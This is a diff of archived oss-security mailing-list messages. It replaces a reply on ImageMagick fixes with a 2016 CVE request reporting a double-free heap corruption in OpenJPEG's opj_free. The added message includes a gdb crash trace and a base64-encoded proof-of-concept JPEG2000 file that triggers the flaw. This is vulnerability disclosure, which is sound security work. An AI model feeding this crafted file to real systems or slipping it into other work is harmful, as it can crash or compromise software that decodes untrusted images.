@@ -1,41 +1,108 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/19/9
-Message-ID: <20160519190037.GA6411@perpetual.pseudorandom.co.uk>
-Date: Thu, 19 May 2016 20:00:37 +0100
-From: Simon McVittie <smcv@...ian.org>
-To: oss-security@...ts.openwall.com
-Subject: Re: ImageMagick Is On Fire -- CVE-2016-3714
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/14/13
+Message-ID: <1F2D4DA31CA62740BFF46830A0E6A4F7064F6978@EXMBX-TJ002.tencent.com>
+Date: Mon, 14 Mar 2016 06:51:53 +0000
+From: winsonliu(刘科) <winsonliu@...cent.com>
+To: oss-security <oss-security@...ts.openwall.com>
+Subject: CVE request - OpenJPEG : Heap Corruption in opj_free function
 Content-Type: text/plain; charset=utf-8
 
-On Thu, 19 May 2016 at 12:25:09 -0600, Kurt Seifried wrote:
-> Without making a commercial pitch for the company I work ... I suspect one
-> aspect of other vendors not fixing this is that there is a very
-> simple/effective/verifiable workaround to prevent exploitation of this
+Hi all,
 
-Having looked into it a bit for Debian, there are several factors:
+I find a vulnerability of OpenJPEG. The specific flaw exists within the opj_free function. A specially crafted JPEG2000 image file can force Heap Corruption occurring in OpenJPEG. This issue can be reproduced in the latest version of OpenJPEG (https://github.com/uclouvain/openjpeg 2016.03.14).
 
-* mitigations exist, like you said
+The detailed information about this issue can be described as follows.
+---------------------------------
+winson@...ntu:~/Desktop/repo/openjpeg/bin$ gdb opj_decompress -q
+Reading symbols from opj_decompress...(no debugging symbols found)...done.
 
-* many of the upstream fixes in ImageMagick are not clearly separated
-  from random other changes (I found one in a commit labelled
-  "Update to the latest autoconf / automake"!)
+(gdb) r -o image.pgm -i heap_corruption.jp2 
+Starting program: /home/winson/Desktop/repo/openjpeg/bin/opj_decompress -o image.pgm -i heap_corruption.jp2
 
-* many of the upstream fixes in ImageMagick (and GraphicsMagick)
-  are really just mitigations too, and they remove features that someone
-  could conceivably have been using, which rather goes against the idea
-  of a stable release with a fixed feature-set
-  (yes, I realise some of those features cannot be done securely)
+[INFO] Start to read j2k main header (131).
+[INFO] Main header has been correctly decoded.
+[INFO] No decoded area parameters, set the decoded area to the whole image
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No incltree created.
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No imsbtree created.
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No incltree created.
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No imsbtree created.
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No incltree created.
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No imsbtree created.
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No incltree created.
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No imsbtree created.
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No incltree created.
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No imsbtree created.
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No incltree created.
+[WARNING] tgt_create tree->numnodes == 0, no tree created.
+[WARNING] No imsbtree created.
+[INFO] Header of tile 1 / 1 has been read.
+[INFO] Tile 1/1 has been decoded.
+[INFO] Image data has been updated with tile 1.
 
-* there are a large number of other issues found via fuzzing, in coders
-  for miscellaneous formats that you'll probably never see "in the wild",
-  which could conceivably also be security vulnerabilities but probably
-  aren't feasible to backport to old releases
+[INFO] Stream reached its end !
+WARNING -> [PGM file] Only the first component
+           is written to the file
+[INFO] Generated Outfile image.pgm
+*** Error in `/home/winson/Desktop/repo/openjpeg/bin/opj_decompress': double free or corruption (!prev): 0x080e7a80 ***
 
-Bob, if you would like distributions to pick up GraphicsMagick security
-fixes in a timely way, it would probably be really useful to do an
-upstream release - distributions are typically a lot more confident about
-backporting large changes to their stable branches without regressions
-if they've been able to get some testing on the same changes in their
-unstable branches first.
+Program received signal SIGABRT, Aborted.
+0xb7fdccb0 in ?? ()
 
-    S
+(gdb) bt
+#0  0xb7fdccb0 in ?? ()
+#1  0xb7df933a in malloc_printerr (action=<optimized out>, str=0xb7eebfd0 "double free or corruption (!prev)", ptr=0x80e7a80) at malloc.c:4996
+#2  0xb7df9fad in _int_free (av=0xb7f30420 <main_arena>, p=<optimized out>, have_lock=0) at malloc.c:3840
+#3  0xb7fc849a in opj_free () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7
+#4  0xb7f98096 in opj_image_destroy () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7
+#5  0x0804ca8e in main ()
+
+(gdb) x /i $eip
+=> 0xb7fdccb0: pop    %ebp
+
+(gdb) i r 
+eax            0x0 0
+ecx            0x2d5d 11613
+edx            0x6 6
+ebx            0x2d5d 11613
+esp            0xbfff9b94 0xbfff9b94
+ebp            0xbfff9e58 0xbfff9e58
+esi            0x78 120
+edi            0xb7f30000 -1208811520
+eip            0xb7fdccb0 0xb7fdccb0
+eflags         0x246 [ PF ZF IF ]
+cs             0x73 115
+ss             0x7b 123
+ds             0x7b 123
+es             0x7b 123
+fs             0x0 0
+gs             0x33 51
+
+
+The attachment is the proof-of-concept file.
+Alternatively, you can decode the following string using base64 and save the decoded content to a .jp2 file.
+---------------------------------
+AAAADGpQICANCocKAAAAFGZ0eXBqcDIgAAAAAGpwMiAAAABbanAyaAAAABZpaGRyAAAAIAAAACAA
+BP8HAAAAAAAMYnBjYwQEBAAAAAAPY29scgEAAAAAABgAAAAiY2RlZgAEAAAAAAACAAEAAAADAAIA
+GQADAAMAAQAAAAABI2pwMmP/T/9RADIAAAAAACAAAAAgAAAAAAAAAAAAAAAgAAAAIAAAAAAAAAAA
+AAQEDwEEAQEEAQEAAQH/UgAMAAAAAQEFBAQAAf9cABNAKDAwODAwODAwODAwODAwOP9kACUAAUNy
+ZWF0ZWQgYnkgT3BlbkpQRUcgdmVyc2lvbiAyLjEuMP+QAAoAAAAAAJkAAf+TwQgDz4AQCcOBA4Ch
+8AIEp8YIBr+vpBAJ18hAA6PjCAOXpU+vpCALHlIPoeDACzrXgKPkCgDP1Tx/p84cA3/dRtwif6fO
+HAN/3VDyfH+AofCKPmKiqS6j5BI9pjRZ2Z4Nooaj4xA9pjRZ2Z4Nv4Cg6MCdlqj4G1+h8I6drClA
+9VfWofCMnawpQPlngP/Z
+
+
+CREDIT:
+This vulnerability was discovered by Ke Liu of Tencent's Xuanwu LAB.
+
+Download attachment "heap_corruption.jp2" of type "application/octet-stream" (414 bytes)
